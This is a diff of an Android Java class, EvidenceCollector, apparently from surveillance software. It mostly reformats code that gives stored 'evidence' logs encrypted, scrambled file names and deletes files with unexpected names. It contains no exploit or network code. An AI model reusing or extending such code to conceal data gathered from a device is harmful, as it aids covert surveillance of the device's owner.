@@ -87,8 +87,7 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String decryptName(final String logMask) {
-		return Encryption
-				.decryptName(logMask, Keys.self().getChallengeKey()[0]);
+		return Encryption.decryptName(logMask, Keys.self().getChallengeKey()[0]);
 	}
 
 	/**
@@ -174,8 +173,7 @@ public class EvidenceCollector {
 		final Context content = Status.getAppContext();
 
 		try {
-			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
-					Context.MODE_PRIVATE);
+			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);
 
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
@@ -183,7 +181,6 @@ public class EvidenceCollector {
 			Log.d("QZ", TAG + " Error: " + e.toString());
 		}
 
-		Log.d("QZ", TAG + " Progressive: " + logProgressive);
 		return logProgressive;
 	}
 
@@ -200,8 +197,7 @@ public class EvidenceCollector {
 		final int lodate = (int) (millis % mask);
 		final int hidate = (int) (millis / mask);
 
-		final String newname = Integer.toHexString(lodate)
-				+ Integer.toHexString(hidate);
+		final String newname = Integer.toHexString(lodate) + Integer.toHexString(hidate);
 
 		return newname;
 	}
@@ -215,8 +211,7 @@ public class EvidenceCollector {
 	 *            the log type
 	 * @return the vector
 	 */
-	public synchronized Name makeNewName(final Evidence log,
-			final String logType) {
+	public synchronized Name makeNewName(final Evidence log, final String logType) {
 		final Date timestamp = log.timestamp;
 		final int progressive = getNewProgressive();
 		Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
@@ -233,13 +228,11 @@ public class EvidenceCollector {
 		Check.asserts(size >= 0, "makeNewName: failed size>0");
 		final String paddedProgressive = mask.substring(0, size) + ds;
 
-		final String fileName = paddedProgressive + "" + logType + ""
-				+ makeDateName(timestamp);
+		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp);
 
 		final String encName = encryptName(fileName + LOG_EXTENSION);
-		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
-				+ " ch: " + seed + " not scrambled: " + fileName
-				+ LOG_EXTENSION);
+		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: "
+				+ fileName + LOG_EXTENSION);
 
 		Name name = new Name();
 		name.progressive = progressive;
@@ -258,7 +251,7 @@ public class EvidenceCollector {
 	 *            the log name
 	 */
 	public void remove(final String logName) {
-		//Log.d("QZ", TAG + " Removing file: " + logName);
+		// Log.d("QZ", TAG + " Removing file: " + logName);
 		final AutoFile file = new AutoFile(logName);
 		if (file.exists()) {
 			file.delete();
@@ -303,8 +296,7 @@ public class EvidenceCollector {
 				final String[] fileLogs = fc.list();
 
 				for (final String file : fileLogs) {
-					final int removed = removeLogRecursive(basePath + file,
-							numFiles - numLogsDeleted);
+					final int removed = removeLogRecursive(basePath + file, numFiles - numLogsDeleted);
 					numLogsDeleted += removed;
 				}
 			}
@@ -369,8 +361,8 @@ public class EvidenceCollector {
 	 */
 	public String[] scanForEvidences(final String currentPath, final String dir) {
 		Check.requires(currentPath != null, "null argument");
-		Check.requires(!currentPath.startsWith("file://"),
-				"currentPath shouldn't start with file:// : " + currentPath);
+		Check.requires(!currentPath.startsWith("file://"), "currentPath shouldn't start with file:// : " + currentPath);
+
 		final TreeMap<String, String> map = new TreeMap<String, String>();
 
 		File fcDir = null;
@@ -394,8 +386,7 @@ public class EvidenceCollector {
 				} else if (file.endsWith(EvidenceCollector.LOG_TMP)) {
 					Log.d("QZ", TAG + " ignoring temp file: " + file);
 				} else {
-					Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir + "/"
-							+ file);
+					Log.d("QZ", TAG + " Info: wrong name, deleting: " + fcDir + "/" + file);
 					final File toDelete = new File(fcDir, file);
 					toDelete.delete();
 				}
